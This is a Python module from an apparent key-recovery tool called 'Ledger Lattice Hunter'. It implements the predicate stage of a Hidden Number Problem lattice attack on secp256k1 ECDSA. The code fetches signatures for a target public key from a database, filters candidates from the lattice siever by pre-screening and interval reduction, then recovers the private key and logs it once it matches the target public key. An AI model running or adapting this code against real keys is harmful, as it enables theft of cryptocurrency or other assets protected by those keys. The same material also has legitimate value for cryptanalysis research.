"""
Predicate for the Ledger Lattice Hunter.

This module contains the logic for the predicate function, which is used
to efficiently check candidate vectors from the lattice siever and identify
the one that solves the Hidden Number Problem.
"""

import logging
from typing import List, Tuple, Optional

import numpy as np
from ecdsa import SECP256k1, VerifyingKey

from ..database.connection import DatabaseConnection
from ..database.models import Signature
from .builder import LatticeBuilder

logger = logging.getLogger(__name__)

# Helper for interval intersection
def intersect_interval_sets(A: List[Tuple[int, int]], B: List[Tuple[int, int]]) -> List[Tuple[int, int]]:
    """ Intersects two lists of sorted, non-overlapping intervals. """
    res = []
    i = j = 0
    while i < len(A) and j < len(B):
        a_low, a_high = A[i]
        b_low, b_high = B[j]

        low = max(a_low, b_low)
        high = min(a_high, b_high)

        if low <= high:
            res.append((low, high))

        if a_high < b_high:
            i += 1
        else:
            j += 1
    return res

class Predicate:
    """
    Implements the predicate for the HNP attack, including the decomposition technique.
    """

    def __init__(self, db: DatabaseConnection, config: dict, builder: LatticeBuilder):
        """
        Initializes the Predicate.

        Args:
            db: An active database connection.
            config: The project configuration dictionary.
            builder: The LatticeBuilder instance used for the current attack.
        """
        self.db = db
        self.config = config
        self.builder = builder
        self.q = SECP256k1.order
        self.predicate_signatures: List[Signature] = []

    async def setup(self, pubkey: str):
        """
        Fetches a fresh set of signatures for the predicate checks.
        The paper recommends using signatures distinct from those used to build the lattice.
        """
        num_sigs = self.config["lattice"]["predicate_num_signatures"]
        # We need to make sure we don't fetch the same ones used in the builder
        # A simple way is to fetch a larger number initially and split them.
        # For now, we fetch a separate batch.
        self.predicate_signatures = await self.db.get_signatures_for_pubkey(pubkey, limit=num_sigs, skip=self.config["lattice"]["sample_selection_factor"])
        if len(self.predicate_signatures) < num_sigs:
            logger.warning("Could not fetch enough distinct signatures for the predicate.")
            # This could be handled more gracefully, e.g., by allowing overlap.
        logger.info(f"Predicate setup with {len(self.predicate_signatures)} fresh signatures.")

    def check(self, v: List[int], klen: int, x_param: int) -> Optional[int]:
        """
        Checks a candidate vector `v` from the lattice siever using interval reduction.
        """
        w = 2**(klen - 1)
        tau = int(w / np.sqrt(3))

        if abs(v[-1]) != tau:
            return None

        x_alpha_0 = v[-2] if v[-1] > 0 else -v[-2]

        if not self._pre_screening(x_alpha_0, w, klen, x_param):
            return None

        alpha_1_low = -x_param // 2
        alpha_1_high = x_param // 2
        
        # This gives the search space for k_0_0
        k_0_0_low = x_alpha_0 + alpha_1_low
        k_0_0_high = x_alpha_0 + alpha_1_high

        reduced_intervals = self._interval_reduction(k_0_0_low, k_0_0_high, w)

        for low, high in reduced_intervals:
            for k_0_0_candidate in range(low, high + 1):
                k_m_candidate = k_0_0_candidate + w
                if self._linear_predicate_check(k_m_candidate):
                    private_key = self._recover_private_key(k_m_candidate)
                    if private_key:
                        return private_key
        return None

    def _interval_reduction(self, low: int, high: int, w: int) -> List[Tuple[int, int]]:
        """
        Reduces the search interval for the hidden number k_0_0 (which is k_m - w).
        Implements Algorithm 4 from the research paper.
        """
        # Start with the initial interval defined by the range of alpha_1
        intervals = [(low, high)]

        # Use some of the predicate signatures to reduce the interval
        # The number of samples to use depends on log(x_param)
        num_samples_for_reduction = int(np.log2(high - low + 1)) + 1
        reduction_sigs = self.predicate_signatures[:num_samples_for_reduction]

        ref_sig = self.builder.get_reference_signature()
        r_m = int(ref_sig.r, 16)
        s_m = int(ref_sig.s, 16)
        h_m = int(ref_sig.h, 16)
        s_m_inv = pow(s_m, -1, self.q)
        r_m_s_m_inv = (r_m * s_m_inv) % self.q

        for sig in reduction_sigs:
            if not intervals: break
            
            r_i = int(sig.r, 16)
            s_i = int(sig.s, 16)
            h_i = int(sig.h, 16)
            s_i_inv = pow(s_i, -1, self.q)
            t_i = (s_i_inv * r_i * r_m_s_m_inv) % self.q
            a_i = (w - (t_i * w) - (h_i * s_i_inv) + (t_i * h_m * s_m_inv)) % self.q

            new_intervals = []
            # k_0_i = t_i * k_0_0 - a_i (mod q)
            # and k_0_i is in [-w, w]
            # so t_i*k_0_0 - a_i - n*q is in [-w, w]
            # => t_i*k_0_0 is in [a_i - w + n*q, a_i + w + n*q]
            # => k_0_0 is in [(a_i - w + n*q)/t_i, (a_i + w + n*q)/t_i]
            
            t_i_inv = pow(t_i, -1, self.q)
            
            # Determine range of n
            n_min = (t_i * low - a_i - w) // self.q
            n_max = (t_i * high - a_i + w) // self.q

            for n in range(n_min, n_max + 2):
                min_k = (a_i - w + n * self.q) * t_i_inv % self.q
                max_k = (a_i + w + n * self.q) * t_i_inv % self.q

                # Handle wrap-around
                if min_k > max_k:
                    new_intervals.append((min_k, self.q -1))
                    new_intervals.append((0, max_k))
                else:
                    new_intervals.append((min_k, max_k))
            
            intervals = intersect_interval_sets(intervals, sorted(new_intervals))
            
        return intervals

    def _pre_screening(self, x_alpha_0: int, w: int, klen: int, x_param: int) -> bool:
        """
        Performs a quick pre-screening of a candidate to eliminate it.
        """
        ref_sig = self.builder.get_reference_signature()
        r_m = int(ref_sig.r, 16)
        s_m = int(ref_sig.s, 16)
        h_m = int(ref_sig.h, 16)
        s_m_inv = pow(s_m, -1, self.q)
        r_m_s_m_inv = (r_m * s_m_inv) % self.q

        bound = w + self.q / (2**(klen+4))

        for sig in self.predicate_signatures:
            r_i = int(sig.r, 16)
            s_i = int(sig.s, 16)
            h_i = int(sig.h, 16)
            s_i_inv = pow(s_i, -1, self.q)
            t_i = (s_i_inv * r_i * r_m_s_m_inv) % self.q
            a_i = (w - (t_i * w) - (h_i * s_i_inv) + (t_i * h_m * s_m_inv)) % self.q

            # The check is: | |x*t_i*alpha_0 - a_i + q/2|q - q/2 | > w + q/2^(l+4)
            val = (x_param * t_i * x_alpha_0 - a_i) % self.q
            val_centered = val if val < self.q/2 else val - self.q

            if abs(val_centered) > bound:
                return False # Fails pre-screening

        return True

    def _recover_private_key(self, k_nonce_candidate: int) -> Optional[int]:
        """
        Given a candidate for the reference nonce, checks if it's correct
        and recovers the private key.
        """
        ref_sig = self.builder.get_reference_signature()
        r_m = int(ref_sig.r, 16)
        s_m = int(ref_sig.s, 16)
        h_m = int(ref_sig.h, 16)
        
        # sk = (s_m * k_m - h_m) * r_m^-1 mod q
        try:
            r_m_inv = pow(r_m, -1, self.q)
            sk_candidate = ((s_m * k_nonce_candidate - h_m) * r_m_inv) % self.q

            # Verify the key by comparing the public key points
            pubkey_point = sk_candidate * SECP256k1.generator
            
            original_pubkey_hex = self.builder.get_target_pubkey()
            original_vk = VerifyingKey.from_string(bytes.fromhex(original_pubkey_hex), curve=SECP256k1)
            original_point = original_vk.pubkey.point

            if pubkey_point == original_point:
                logger.info(f"Private key recovered: {hex(sk_candidate)}")
                return sk_candidate
        except Exception as e:
            logger.debug(f"Key recovery failed for nonce candidate {k_nonce_candidate}: {e}")

        return None

    def _linear_predicate_check(self, k_m_candidate: int) -> bool:
        """
        Performs a quick check on a reconstructed k_m candidate using fresh signatures.
        """
        # This check uses the linear relationship from the ECDSA signature equation
        # s_i*k_i = h_i + sk*r_i mod q
        # => s_i*k_i - s_m*k_m * (r_i*r_m^-1) = h_i - h_m*(r_i*r_m^-1) mod q
        
        ref_sig = self.builder.get_reference_signature()
        r_m = int(ref_sig.r, 16)
        s_m = int(ref_sig.s, 16)
        h_m = int(ref_sig.h, 16)
        r_m_inv = pow(r_m, -1, self.q)

        for sig in self.predicate_signatures:
            r_i = int(sig.r, 16)
            s_i = int(sig.s, 16)
            h_i = int(sig.h, 16)
            
            # We don't know k_i, but we know its top bits are 0.
            # So, k_i is small.
            # We check if the equation holds for a small k_i.
            
            # Left Hand Side (LHS) depends on the unknown k_i
            # Right Hand Side (RHS) is known
            # LHS = s_i*k_i - s_m*k_m * (r_i*r_m^-1)
            # RHS = h_i - h_m*(r_i*r_m^-1)
            
            # Instead of solving for k_i, we can check a related property.
            # From a single signature: sk = (s*k - h) * r^-1
            # For two signatures (i,m): (s_i*k_i - h_i)*r_i^-1 = (s_m*k_m - h_m)*r_m^-1
            # s_i*k_i*r_i^-1 - h_i*r_i^-1 = s_m*k_m*r_m^-1 - h_m*r_m^-1
            # s_i*k_i*r_i^-1 - s_m*k_m*r_m^-1 = h_i*r_i^-1 - h_m*r_m^-1
            
            # The value k_i must be in the range [0, 2^klen)
            # We can solve for k_i and see if it's in the correct range.

            rhs = (h_i * pow(r_i, -1, self.q) - h_m * r_m_inv) % self.q
            lhs_k_m_part = (s_m * k_m_candidate * r_m_inv) % self.q
            
            # s_i*k_i*r_i^-1 = rhs + lhs_k_m_part
            s_i_r_i_inv = (s_i * pow(r_i, -1, self.q)) % self.q
            
            # k_i = (rhs + lhs_k_m_part) * (s_i*r_i^-1)^-1
            k_i_candidate = ((rhs + lhs_k_m_part) * pow(s_i_r_i_inv, -1, self.q)) % self.q

            # Check if the recovered k_i is in the expected range
            if not (0 <= k_i_candidate < 2**self.config["lattice"]["klen"]):
                return False
        
        return True 